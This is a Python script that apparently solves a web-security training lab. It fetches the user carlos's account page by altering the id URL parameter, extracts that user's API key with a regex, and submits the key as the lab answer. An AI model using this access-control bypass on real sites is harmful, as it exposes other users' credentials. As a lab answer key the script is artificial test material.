#################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User ID controlled by request parameter
#
# Steps: 1. Fetch the carlos profile using id URL parameter
#        2. Extract the API key
#        3. Submit the solution
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ac700d704f3b74a82fdabc000f6004e.web-security-academy.net"

try:  
    # fetch carlos profile using id URL parameter
    carlos_profile = requests.post(f"{url}/my-account?id=carlos")
    
except:
    print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
    exit(1)

print(Fore.WHITE + "1. Fetching carlos profile page.. " + Fore.GREEN + "OK")

# extract the API key
api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]

print(Fore.WHITE + "2. Extracting the API key.. " + Fore.GREEN + "OK")

# set answer  
data = {
    "answer": api_key
}

try:
    # submit the solution
    requests.post(f"{url}/submitSolution", data)
    
except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "3. Submitting the solution.. " + Fore.GREEN + "OK")        
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


